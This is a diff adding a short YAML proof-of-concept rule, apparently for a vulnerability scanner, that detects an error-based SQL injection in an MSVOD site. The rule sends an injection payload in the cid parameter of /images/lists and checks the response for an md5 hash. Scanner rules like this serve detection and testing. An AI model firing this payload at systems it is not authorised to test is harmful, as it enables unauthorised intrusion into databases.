@@ -1,0 +1,12 @@
+name: poc-yaml-msvod-sqli
+set:
+  r1: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: "/images/lists?cid=1 ) ORDER BY 1 desc,extractvalue(rand(),concat(0x7c,md5({{r1}}))) desc --+a"
+    expression: |
+      response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+detail:
+  author: jinqi
+  links:
+    - https://github.com/jinqi520
